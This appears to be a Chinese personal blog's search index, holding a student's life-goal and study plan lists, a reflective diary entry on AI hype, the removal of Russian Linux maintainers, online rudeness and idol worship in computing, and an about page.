","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:3:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#系统科研阶段"},{"categories":null,"content":" 4 完全升级阶段 去四大读PhD，发表5篇系统顶级会议论文毕业，期间去大厂做research scientiset实习 📅 2028-9-1 在OSDI、SOSP等顶级系统会议发论文（MIT PDOS的强项） 参与颠覆性项目：比如开发新操作系统（如MIT的\"Exokernel\"）、分布式系统、安全技术等 与图灵奖得主合作：如Barbara Liskov（MIT教授，分布式系统先驱） 成为学术新星：优秀者可能直接拿到名校教职（如哈佛、斯坦福、CMU） 硅谷科技巨头实习：Google、Meta、Apple等会主动挖MIT系统方向的PhD 对冲基金量化研究：Citadel、Two Sigma等年薪$300K+的岗位偏爱MIT背景 创业或技术高管：比如Dropbox创始人Drew Houston就是MIT校友 政府/国防项目顾问：DARPA（美国国防部）常与MIT合作，涉及网络安全、AI等 ✅ 技术突破：比如设计出下一代云计算架构，被AWS/GCP采用。 ✅ 创业成功：像Docker那样改变整个软件开发方式。 ✅ 学术荣誉：获得NSF CAREER Award（青年教授最高荣誉之一）。 ✅ 行业影响力：成为Linux基金会、CNCF等开源组织的核心贡献者。 毕业后 顶级大学教职：MIT、Stanford、Berkeley等（年薪150K−150K−250K） 国家实验室：如MIT Lincoln Lab（做国防级研究） 硅谷巨头：Google Fellow（年薪$500K+）、Meta首席工程师 华尔街量化：Citadel/DE Shaw量化研究员（年薪300K−300K−1M+） 创业公司CTO：融资千万美元级，比如Rust语言相关的初创公司。 DARPA项目经理：主导国家级科研项目 干到国外的tenure 在大厂做出突出的科研成就，升职到CEO的位置 在CEO的位置领衔世界科技发展 考一个小提琴本科，拿到帕格尼尼竞赛的金奖 ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:4:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#完全升级阶段"},{"categories":null,"content":" 5 其他 最喜欢的事情 数学 计算机 物理 健身 下厨，找好的参观探索 音乐 羽毛球 乒乓球 攀岩 游戏 小提琴 旅游 我赚钱的路子 计算机教育项目 数学教育项目 英语教育项目 考研复习教育 Security Bounty 系统 bug TopCoder 游戏开发 App 开发 外包接单，包括政府项目接单 算法比赛奖金 数据科学竞赛奖金 教留学生写作业赚钱 英语家教 量化交易系统 考研科目家教 英语翻译 写文章投稿 雅思、托福、GRE 培训 下厨UP主 拉琴UP主 唱歌UP主 出国攻略 减肥出书 考研攻略 CPA攻略 小提琴演奏 电吉他演奏 作曲接单 编曲接单 国际象棋比赛 实现手机上的那些创业idea 成为大厂的头头，大厂挣钱 ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:5:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#其他"},{"categories":null,"content":" 6 如何脱离控制欲强的父母 赶紧把各方面能力提升，包括肌肉力量提升，身体素质提升，还有其他的生活技能提升 尽量少呆在家里，少和他们呆在一起 润到外地去工作，不要告诉父母租房住址 在外面交很多新朋友，扩大社交圈，顺带找到男朋友 节假日别回家，尽量出去玩，不要呆在家里，以防人找上门 拉黑手机，不要接他们电话和消息 经济完全独立，赚钱的数目是他的十倍 不要天天跟他们打电话，不要事事和他们报备 有强大的个人能力，不畏惧未知的事物 不要为他们说的话而感到愧疚，不要自责 把跟他们的空间彻底拉开 正确识别并拒绝精神PUA，当心苦肉计 有自己的个人生活，有自己的朋友圈 有能力独立生活，享受自己的生活 意识到父母是改变不了的，不要试图去跟他们讲道理，放弃改变他们与同他们沟通的念头 多想想让人高兴的事情，多和好朋友交流，保持心情愉快，拒绝精神内耗 多做让自己高兴的事情，不要因为父母影响到自己的心情 如果到了外地他们还要追过来，就跑路到美国去 ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:6:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#如何脱离控制欲强的父母"},{"categories":null,"content":" 7 24岁前的奋斗目标 全方位能力提升 找到工作 香港地区硕士申请完成 赚到人生的第一桶金 脱离父母对我人生的控制 底层知识全部扎实掌握，阅读大量顶会论文，发表3篇顶会论文（各个方向都要学习，AI+系统方向），不要把路子走窄了，以后是有用处的（科研） 成功申请到国外名校的硕士或者考上上海交大的硕士（学历） 在大厂干到高层，学习优秀的项目管理经验和人力资源管理经验（工作经验） 找到真心相爱的男朋友，共同奋斗（生活） 实现自己的所有创业idea，顺利攒到1000万，为我的未来作保障（钱） 在这些都做完后，好好的谈个恋爱，享受一下美好的生活（所以说啊，越快实现，享受就来的越快，否则后面拖久了，没时间享受了喔，所以要抓紧努力）（生活） 数学和物理水平达到彪悍的级别 羽毛球、乒乓球水平达到高级 小提琴水平达到高级 参加量化公司的工作、大厂基础架构的工作 学习投资理财管理，金融风险管理，财务管理，企业管理，创新创业管理，为未来缔造新的互联网巨头公司和商业公司做准备 积累大厂和量化企业的实习经验，方便在后期做更多工作，多参与企业工作 和MSRA这样的科研机构进行科研合作 自己开发出有创造力的科技科研产品，改变人类未来 努力科研，为申请MIT PDOS Lab做准备 成为人生赢家！ ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:7:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#24岁前的奋斗目标"},{"categories":null,"content":" 8 几个重要的人生节点 1月20号之前把所有学习任务搞定，投递简历 报名2月5号的雅思考试 ✅ 2025-01-17 1月25号前完成所有任务，并且定下工作，雅思刷题 过年期间：1. 刷雅思题目 2. 阅读海量论文 3. 搞钱 2月份确保进入大厂工作（如字节跳动） 2月5号考雅思，5号之前反复刷雅思真题，并且把申请材料全部准备完成 2月6号直接参加工作 2月10号拿到雅思成绩后完成所有申请工作 5月份之前把大厂产品研究工作完成，所有系统顶级会议论文研读和复现任务完成 5-6月份确定科研idea，并且开始着手做实验和写论文（利用大厂的资源） 6月底联系MSRA老师，争取7-8月份加入MSRA做科研实习，在这期间开始准备GRE和托福考试 9月-2026年2月间和MSRA老师合力完成科研任务，发表系统顶级会议论文，争取发表第一篇自己的系统顶级会议论文 2026年2月-2026年6月间参加幻方量化的实习 2026年5月研究生毕业后继续回到字节跳动工作，继续做科研，争取发表系统顶级会议论文 2026年5月-2026年11月间发表自己的第二，三篇论文，11月份申请MIT PDOS Lab的phD 2026年11月-2027年8月发表自己的第四篇系统顶级会议论文，入学MIT PDOS Lab 基础知识和技能全部学习完成，外貌改造计划完成 📅 2025-1-16 搞到一笔基础启动资金 📅 2025-1-16 申请到香港/新加坡大学硕士 📅 2025-1-19 大厂工作经验快速积累 量化企业工作经验快速积累 MSRA科研实习经历快速积累 通过技术、工作和学习实现大量的人脉拓展 通过多种方法搞到足够多的钱 努力科研，做出顶尖的科研成果和论文 努力写代码，积累创新的、对计算机行业有重大影响的、改变人类未来的计算机科技项目 申请MIT PDOS Lab的phD 在phD期间去Google、Amazon等地方做Researcher internship工作，保证和工业界的connection phD期间努力科研，发表多篇顶尖论文 phD毕业后加入Google、Amazon等大厂做research scientist 努力利用大厂资源科研，向田渊栋那样的老师学习，成为科研巨佬和技术巨佬，坐到Jeff Dean等同的位置 做到CEO的位置，也可以自己创业 做出改变人类历史发展、改变人类未来生活的突出科技成果，成为乔布斯、苏妈那样伟大的CEO 要保持健身习惯，羽毛球可以平时打一打，小提琴技术要磨练到顶尖水平 加油！ ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:8:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#几个重要的人生节点"},{"categories":null,"content":" 9 5年内的终极目标 成为卡马克和法布里斯贝拉那样改变世界的程序员，在开源社区拥有杰出声望 发表多篇系统顶级会议论文，成为系统科研巨佬 拿到帕格尼尼小提琴比赛冠军 申请到MIT PDos Lab的phD 赚到3000w 在上海有一套房 家庭后备风险预防：赚到尽可能多的钱，提高社会地位和社会影响力，提升人脉关系 ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:9:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#5年内的终极目标"},{"categories":null,"content":" 10 人生目标 在组合数学方面做出突出成就，解决组合数学的难题 做出领衔世界的系统科研、让AI造福人类生活、让更多好的游戏给人们带来欢乐、让科技改变世界。倡导世界开源共享共建，而不是搞封闭主义。做出法布里斯贝拉贝拉、卡马克那样的突出成就。做一个对社会、对世界科技有贡献，但是低调的人。 要成为比尔盖茨那样的成功的企业家，要做有良心的企业家，要用自己的技术报答社会 在小提琴方面达到顶尖水平，推广音乐素质教育 在羽毛球、乒乓球、游泳等方面达到较高水平，推广全民运动 让父母能过上好生活，也能让更多人能够吃到科技进步的福利。 用人工智能方法解决阿尔兹海默症的问题 帮助非洲国家走出贫穷和疾病，让他们有饭吃 解决中国计算机科学技术教育的问题 让中国成为世界科技巨头 成为像Jeff Dean那样对社会有帮助的计算机科学家 ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:10:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#人生目标"},{"categories":null,"content":"其实我不喜欢写日记，但是最近发生的一些事情，让人脑子里弯弯绕绕的想法结在一起。于是想到使用日记的方式来整理一下思绪，顺带思考一下未来的人生方向。 ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:0:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#"},{"categories":null,"content":" 1 新闻快递最近几个月里，行业内发生了一些事情： 诺贝尔物理学奖颁发给了研究深度学习的Hinton和一位物理学家 Linus和他的部下将来自俄罗斯的Maintainers从邮件列表中移除 此外，最近一些日子，我看到： 知乎为我推送许多关于大模型相关的信息，包括某某大模型击败了某某大模型，登顶某某榜单，但是我对深度学习这种底层并不清晰的技术并不那么感兴趣，大模型亦如是 图形学会议siggraph和操作系统会议osdi已经接受了很多深度学习相关的文章，包括深度学习生成某某某、深度学习系统之类的 此外，其他的一些信息包括： 华为的朋友说工作非常累 字节的朋友说字节没有人情味 腾讯的朋友说在腾讯工作，把身体干出问题了 ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:1:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#新闻快递"},{"categories":null,"content":" 2 AI Good or Bad？对于诺贝尔物理学奖颁发给Hinton和另一位物理学家，数理群里的纯数和物理同学认为真难以理解，并且使用了丘成桐笑话来嘲讽。另一边CS群内的群友对于人工智能渗透了其他的领域而沾沾自喜。知乎上的统计物理人觉得自己的选择非常英明，对于脱离了理论物理的群体而感到非常庆幸。知乎上的ai同学为人工智能渗透了其他行业而感到骄傲，有的言论非常嚣张和离奇，包括但不限于： 颁给深度学习，这是因为传统物理没有任何做出突出成就的人； 我曾经因为数学差而感到自卑，但是在我发现炼丹的结果不需要使用那么多的数学来解释的时候，我觉得非常自豪，我认为数学差也无所谓，理论基础不重要； 深度学习的数学基础搞不出来，是因为那些搞数学的人水平太差； 只要Hinton一声令下，我们全体ai小将都听从hinton祖师爷的命令，hinton指哪我们就打哪； AI的发展带来了自动化的写作和办公，当然是有益处的。但是我更喜欢原理清晰的科学，解释性强的科学，不太喜欢玄学和炼丹。 我相信，在最初提出人工智能的时候，人们的期许应当是\"ai替代人去做重复的工作，而人去做创造性强的工作\"。而现在搞出来的效果就是，ai在画画，ai在拉琴，ai在聊天，ai在下棋，而很多人还在工厂操作自动机器，在流水线上，在日复一日的干苦力。ai无法陪伴我老年痴呆的外婆，京东上搜索出来的都是陪伴机器人都是会念诗的宝宝早教机。ai带来了绘画的版权问题，而它自己画出来的东西也时常诡异。有的论文中实现ai拉小提琴，但是出来的效果也像是锯木头一般。 此外，对 ai 的训练，也只有大企业能够负担的起。我以前的一个重庆大学的学长告诉我说，他认为以后 ai 科研的效果会受实验室硬件资源的限制。那个时候还没有GPT-4，现在看来此话不假。 更让我头疼的一点是，一些知乎营销号和问题，经常提出xxx模型击败了xxx模型，你怎么看之类的问题。我并不那么关心ai方向的发展，我也不太关心谁击败了谁。但是我经常在知乎刷到大模型相关的问题，你击败我，我击败你。知乎的屏蔽词的设置需要花钱开会员，因此这问题我还被天天推送，很烦啊。 ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:2:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#ai-good-or-bad"},{"categories":null,"content":" 3 开源精神存在吗？俄罗斯人的数学和计算机功底强劲，这是大家有目共睹的。当然他们也为Linux贡献了不少代码，也为计算机行业的发展做出了许多突出的贡献。但是Greg K-H在毫无预兆的情况下移除了他们的代码，并不是因为他们注入了什么安全漏洞，而是因为抽象的战争原因。此外，他们并没有因为战争原因将以色列人从Maintainers中移除掉，只是移除了俄罗斯人。这不免让人思考是否有一些额外的政治隐情。 当然，如果只是Greg的行为令人不满，大家还在猜测是否有美国方面的原因。Linus本人的回复，更是让人难以接受。其称非常支持这种行为，并且称俄罗斯和芬兰曾经发生战争，因此他当然非常乐意移除俄罗斯人。 俄乌战争在几年前就打起来了，他们一直在接受俄罗斯人的贡献和维护。但现在接受了别人的维护，但是突然将其从Maintainers中清理掉，并且表示他压根就不喜欢俄罗斯人。移除别人的时候，也并没有走正经的程序。我个人认为这种行为破坏了开源的精神，并且非常无耻。 此外，有的群友的态度更是让我吃惊，其认为Linus的历史理由有点扯淡，但是这么做完全合理，是因为没有破坏协议内容。其认为开源的意思就是开放源代码，没有别的意思，你可以做贡献，你可以fork，但是他爱移除你就移除你，这是他的自由，这是他的权力，开源项目独裁管理是完全合理的。 我和他的争论引发了群友们关于开源精神的激烈讨论。有的群友认为，除了RMS以外，根本就没人表示过开源精神，压根没人弄清楚过开源精神，开源精神是不存在的。Linus本人也从未认同过开源精神。也有很多人认为，只要在协议的范围内办事，那么他爱怎么干怎么干。有着这样想法的人，我发现很多都是使用开源项目，必要的时候贡献开源项目，但是对开源项目和开源社区并没有那么大的热忱。当然，也有很多学计算机的群友，同我一样是出于开源精神的自由、平等、共建，而去参与开源社区，努力的想让软件生态变得更好。我的想法是，如果大家靠的是冰冷的协议来维系，可能根本就不会有那么多人去参与开源项目的建设。政治原因的插手更是直接破坏了开源精神。但是貌似很多朋友，更多的是看协议的内容，研究软件著作权到底归谁，这个项目的代码到底开放不开放，对他们有没有益处。他们认为允许你fork仓库，就是很大的自由了。说实话这种想法让我非常吃惊，虽然我也不知道自己是什么时候了解了开源精神，参与到了开源项目，并且自发的投入到社区的建设当中去。但是我一直以来接受的开源思想，就是自由、共建、共享、共惠。有的人说这个精神是老白左的天真想法。不知道该如何回应。 ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:3:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#开源精神存在吗"},{"categories":null,"content":" 4 他人即地狱？在与人进行网络交流的过程中，我多次发现很多人并不非常友善。 一些人在群内经常使用如下言论对他人进行攻击： 我看你倒像是个新来的。 兄弟我说你是不是不认字啊？ 我看你是睡觉把脑子睡糊涂了。 你是不是脑子有问题？ xxx魅力时刻。 不会真的有人以为xxxx吧？ 蠢。 这都不会。 不知道你是真脑子缺根弦还是故意演成一个傻子。脑子符合ID。这脑子就别出墙了。 xxxx难道没学过吗？ 我在知乎，提出《哈利波特与魔法石》很好看，但是周一时候看的人不多，便有人评论： 这种又老又过时的片子本来就没人看。 我一向认为，不管是现实中，还是网络上，对于别人都应该有着基本的礼貌和尊重，尽量不要说让人不愉快或者泼冷水的话。非常好奇这些人是否受过基本的家庭教育，有着基本的教养，在外是否对自己的朋友、师兄弟、学长学妹、老师都这么说话。还是说就是仗着网络上面，别人打不到他，遂如此猖獗。此类人我极其反感，破坏正常的网络社交秩序，破坏别人一整天的好心情。 ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:4:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#他人即地狱"},{"categories":null,"content":" 5 造神与塌房？计算机行业许多人有偶像，也喜欢拜神，就我听到过的同学所拜的神包括但不限于如下： Kaiming He 贾扬清 Hinton Linus Jeff Dean Ilya Sutskever 当然我自己也有一些很崇拜的偶像，包括： 法布里斯贝拉 约翰卡马克 雷军 scihub的创始人（可爱的俄罗斯大妹子！）Sci-Hub: Alexandra Elbakyan 以上几位一直是我的偶像，我也在努力的通过学习，向他们靠拢。尤其是雷军和卡马克的创业神话，更是让我心潮澎湃。卡马克在做探索的时候，会废寝忘食，甚至一次实现多个游戏引擎。他允许玩家修改游戏，创建自己的mod，他是开源精神的超级忠实者。我也想成为他那样厉害的人。 但是我发现我的一部分同学，在拜神的同时，下意识地认为自己一辈子都无法达到他们的成就，甚至超越他们。我认为偶像应该是要努力的靠近，甚至超越。虽然现阶段这么说可能会显得有些自恋，但是我认为self-fulfilling prophecy是完全正确的。如果你在心里就默认自己无法达到他们的成就，那么大概率你一辈子确实无法达到了。人生很长，应该先着手出发，我们看不到很远的地方，但是我们可以逐步的递进，一步步走到更高处。可能走着走着，我们就已经超越了他们，而不是局限于他们为我们创造的世界。 再谈造神和神的塌房。Linus这人就不说了，早年开发出了Linux的时候，用一纸邮件呼吁全世界的开发者来帮他。后来就是fuck这个，fuck那个。现在打着战争的旗号，直接将贡献颇多的俄罗斯程序员从Maintainers中移除，并且还使用着别人的代码。顺带在回信中展示了一把自己的\"政治露阴癖\"。 此外，我搜索过Greg K-H，包括很多一些其他的开发者的访谈。给人的感觉就好像努力的在表现一种设定，我喜欢使用什么什么工具，我在编码的时候喜欢听什么什么音乐，我有什么什么癖好，我喜欢穿什么什么衣服。他们通常表示自己非常友好，非常乐于亲近新手，非常乐于和人交流。 但是实际上表现出来的，是高人一等的姿态，是计算机行业精英和大牛阶层的自我高潮。好像他们亲近新手不是因为他们真的像父亲带一个宝宝一样，热烈期盼着新手的成长，而是因为他们觉得表现出和新手亲近的姿态会比较体面。 包括 Greg 让新手从小处着手开始贡献。但是他的访谈里有几段话让我印象深刻，表示\"你不知道哪天会遇到以前只在邮件里跟你互动的人\"。他曾经多次在邮件上拒绝一个开发者贡献的代码提交，在几次更新迭代后才接受提交。结果后来有一次在攀岩馆遇见他。于是觉得\"在邮件上还是转变态度的好，不然你不知道哪天会遇见并有求于人\"。并且表示\"另一件很棒的就是所有与你共事的伙伴几乎都在不断的换工作，但无论他们为哪家公司供职，你们都始终在同一个项目中合作，你的合作者可能会来自世界上不同的地方\"。这几段话让我觉得非常不舒服，包括但不限于： 在对新手提意见时表示\"可以从小处着手贡献\"，结果是\"多次拒绝他的提交\"； 邮件上对人苛刻，在现实中遇到后，立马转变态度，表示\"不知道哪天会遇见并且有求于人\"； 表示\"认为和世界上不同地区的人在一起工作是很有趣的事\"，现实中打着政治的口号，一把踹掉了来自俄罗斯的Maintainers； 就好像Jeff Dean说自己在谷歌工作了多少年，他的工作时长超过了谷歌百分之99.9%人。谷歌的副总裁在软件上同他互动。实际上他们不会关心其他的谷歌的其他软件工程师做了什么，谷歌的副总裁也不会在社交软件上和普通的谷歌软件开发者进行互动。顶尖的软件工程师和创业者会激情互动，一起开会，一起参加活动。而普通的软件行业从业者只能远远的看着，就好像安徒生《卖火柴的小女孩》中，卖火柴的姑娘看着温暖的屋子里的人合家团聚，而期盼的能有人在软件行业的寒冬能够来买一根自己的小火柴，而幻想着自己也可以在温暖的房间里，和家人在一起。 我看过知乎上许多人提的Jeff Dean相关的梗，比如：那些关于Jeff Dean的事（jo）实（ke） - 知乎。包括他说自己用过多少种语言，回答网友一些好奇的问题等等。这算是比较友好的大牛了。当然你要问程序员们想不想也成为Jeff Dean这样的大牛，受到人追捧，那自然是想的。不然也不会有那么一些人组建一些相关方向的群聊和组织，自己做群主，他们的群友也基本都是自己的信徒。也不会有一些人，时不时的在网络上发表一些惊人言论，于是便会吸引一些人来看，自己也跟着红起来（有时候黑红也是红嘛~）当然也有一些人依靠强悍的编码能力，吸引一波教徒。也有人依靠强悍的网络安全能力，吸引一波教徒。他们纷纷为自己起不同的花名，于是教徒便亲切的以花名称呼他们，他们也以花名混迹互联网江湖。 我不太喜欢起花名，享受别人追捧的人。我也不太喜欢AI方向那些造神的行为，虽然其中很多的人做出的成就确实厉害。我更不会追捧某人。人总是会因为追捧某人，而美化他的形象，合理化他的行为，可能还会在各种场合用他的梗图，在各种时候提到他的名字。当然在他做出不合理行为的时候，有的人会祛魅，而有的人会继续大力支持，哪怕他干的事情很抽象。这说白了和偶像饭圈没有什么差别。当然 Linus 这个事情，也算是给人提了个醒。在华为发布鸿蒙的时候搞这么一出，更是有趣。最重要的是，造神和拜神会让自己在心里默认，自己一辈子都超越不了他们，定死了自己的上限。 ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:5:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#造神与塌房"},{"categories":null,"content":" 6 计算机行业人应该如何才能 Survive？之前知乎上有个问题，问到底是读系统的phD还是ai的phD，哈哈哈。如果你问我，那我自然是读系统方向。人生苦短，为什么不选择自己喜欢做的事情呢？当然了，经济压力会非常大。那就努力吧~ 现在计算机行业的人实在是多。尤其是ai方向，大批非计算机专业的都涌了进去，这行情只会越来越难。资本家当然也更加猖獗，毕竟他们不缺人。当然了，对顶层那些大佬应该是没什么影响的。我觉得，人不能因为现阶段看不到未来，看不到意义，就不去努力了，努力总是能带给人新的惊喜的。加油！ ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:6:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#计算机行业人应该如何才能-survive"},{"categories":null,"content":" 7 个人反思总是在社交网络中内耗，我觉得还是应该更多专注于自己的事业。这样也不会去看到那些垃圾信息，还有那些无关的垃圾人。有时候看社交媒体不是为了凑热闹，而是因为担心自己缺乏和外界的交流，害怕自己和时代脱轨，害怕自己在固执中走向岔路。但是又屡屡在同人交流的过程中受伤。 人总是想要在有限的人生中达到自己人生价值的最大化，但是时间不允许我们回到过去，通过动态规划储存多个人生状态，从而找到人生的最优解。因此人生的每一步都是贪心算法。我们总是在衡量贪心算法每一步的效率，从而造成了人生的踟蹰不前。有的人问为什么自己的执行力不够强，那是因为看不到未来。如果告诉你，你这么努力，你在5年后就会成为世界软件巨头的老板，你还会踌躇不前吗？你不会。因此很多时候犹豫和摆烂不是因为懒，是因为迷茫。 但是我们知道，只要努力，就可以创造一些未知的，令人惊艳的东西，只要努力。所以努力前进吧！ ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:7:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#个人反思"},{"categories":null,"content":" 8 我的期许 中国的计算机教育可以走向一个更高的水准 中国也可以有优秀、干净、开放、自由的开源平台和软件市场 开源项目是所有人共同贡献的成果，不再是独裁者随意拉屎拉尿的茅厕 计算机新手和巨佬也能平等的交流，不再有任何的辱骂、歧视，也没有畸形的巨佬崇拜 人人皆能对他人有礼貌和尊重 ai 能够真正帮助人类，人类可以去从事一些更加有创造力的活动 资本家不再把人当作纯纯的牛马糟践 ","date":"2024-10-26","objectID":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/:8:0","series":["记录"],"tags":null,"title":"群体众生相和一些反思","uri":"/%E7%BE%A4%E4%BD%93%E4%BC%97%E7%94%9F%E7%9B%B8%E5%92%8C%E4%B8%80%E4%BA%9B%E5%8F%8D%E6%80%9D/#我的期许"},{"categories":null,"content":"待到秋来九月八，我花开后百花杀。 冲天香阵透长安，满城尽带黄金甲。 —— 黄巢《不第后赋菊》 ","date":"2024-10-26","objectID":"/about/:0:0","series":null,"tags":null,"title":"关于 Wen Gao","uri":"/about/#"},{"categories":null,"content":" 1 关于我我本科毕业于武汉科技大学计算机科学与技术学院，现在考取了上海交通大学软件学院研究生，同时申请了香港的大学，并且同时在找工作，还没有确定具体去哪里。我热爱计算机系统方向的开发及科学研究，对于计算机体系结构、操作系统、编译器、数据库、分布式系统和系统安全方向比较感兴趣，会打一些算法比赛（如Codeforces、AtCoder、LeetCode周赛等），有时候也会打一些CTF。如果对我感兴趣，可以邮件到 iamgwen9@gmail.com 联系我。 ","date":"2024-10-26","objectID":"/about/:1:0","series":null,"tags":null,"title":"关于 Wen Gao","uri":"/about/#关于我"},{"categories":null,"content":" 2 我的技术我的主攻方向在于计算机系统软硬件方面，除此以外擅长一些机器学习和深度学习、Qt 嵌入式编程、单片机编程、面包板焊接、Web 前后端开发、安卓软件开发，但是学的不深。 ","date":"2024-10-26","objectID":"/about/:2:0","series":null,"tags":null,"title":"关于 Wen Gao","uri":"/about/#我的技术"},{"categories":null,"content":" 3 我的生活我喜欢骑车、爬山、游泳、健身、听音乐（流行、R\u0026B、蓝调、爵士、乡村音乐、灵魂乐、一些经典摇滚乐、古典音乐以及电影原声带比较多）、看电影（喜欢《教父》等经典影片）、下厨和拉小提琴。我很想养一只布偶猫，希望未来可以实现。 ","date":"2024-10-26","objectID":"/about/:3:0","series":null,"tags":null,"title":"关于 Wen Gao","uri":"/about/#我的生活"},{"categories":null,"content":" 4 我的信仰我的偶像是毛主席和周恩来，我的目标是改变当前中国。我希望未来： 中国的计算机科学教育能够和美国水平相当，甚至超越； 中国的计算机学生能够不只是普通的调参、调库、写框架，能够有扎实的系统基础和数学基础，做到自己造出性能更好的基础架构，能够实现更多创新的产品，而不是跟在别人屁股后面实现别人已经实现过的东西，要实现创新和超越； 中国的大学能够塑造出一流的计算机人才，老师能够重视基础教育，对学生有尊重；能够引入更多有活力的年轻人，做出世界一流的科学研究，而不是整天发文章灌水、接横向、骗经费、拿学生当耗材； 努力的人都能得到应有的回报，而不是被一些特权阶级抢占高位； 人民群众的基本利益能够得到重视和保护。伤害人民群众的犯罪分子，都应该被法律所严惩，而不是逍遥法外； 霸凌犯和强奸犯应当终身不可再考取学校和任何职业，直接进监狱。应该对被霸凌者和被强奸者提供心理疏导服务，并且保护他们的隐私； 